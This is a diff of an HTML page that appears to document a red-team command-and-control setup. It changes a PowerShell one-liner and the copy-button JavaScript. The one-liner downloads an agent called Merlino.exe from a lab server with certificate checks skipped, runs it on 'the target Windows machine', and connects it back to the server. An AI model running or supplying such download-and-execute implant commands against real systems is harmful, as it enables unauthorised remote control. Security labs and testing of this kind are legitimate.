@@ -415,13 +415,13 @@
             <div class="code-block">
                 <button class="copy-btn" onclick="copyMerlinoCommand()">Copy</button>
                 <span class="comment"># Run this in PowerShell on the target Windows machine</span><br>
-                <span class="var">$s</span>=<span class="string" id="merlino-server">"192.168.124.133"</span>;<span class="command">curl.exe</span> -k -H <span class="string">"file: Merlino.exe"</span> <span class="string" id="merlino-download">"https://192.168.124.133/file/download"</span> -o Merlino.exe;.\Merlino.exe -server <span class="string" id="merlino-connect">"https://192.168.124.133"</span>
+                <span class="command">curl.exe</span> -k -H <span class="string">"file: Merlino.exe"</span> <span class="string">"https://192.168.124.133/file/download"</span> -o Merlino.exe; .\Merlino.exe -server <span class="string">"https://192.168.124.133"</span>
             </div>
             
             <h3>Manual Agent Execution</h3>
             <div class="code-block">
                 <span class="comment"># With custom group and sleep interval</span><br>
-                .\Merlino.exe -server <span class="string" id="merlino-manual">"https://192.168.124.133"</span> -group <span class="string">"red"</span> -sleep <span class="string">60</span>
+                .\Merlino.exe -server <span class="string">"https://192.168.124.133"</span> -group <span class="string">"red"</span> -sleep <span class="string">60</span>
             </div>
             
             <div class="success-box">
@@ -563,7 +563,7 @@
         
         function copyMerlinoCommand() {
             const vmIP = getVMIP();
-            const command = `$s="${vmIP}";curl.exe -k -H "file: Merlino.exe" "https://$s/file/download" -o Merlino.exe;.\\Merlino.exe -server "https://$s"`;
+            const command = `curl.exe -k -H "file: Merlino.exe" "https://${vmIP}/file/download" -o Merlino.exe;.\\Merlino.exe -server "https://${vmIP}"`;
             
             navigator.clipboard.writeText(command).then(() => {
                 const btn = document.querySelector('.copy-btn');
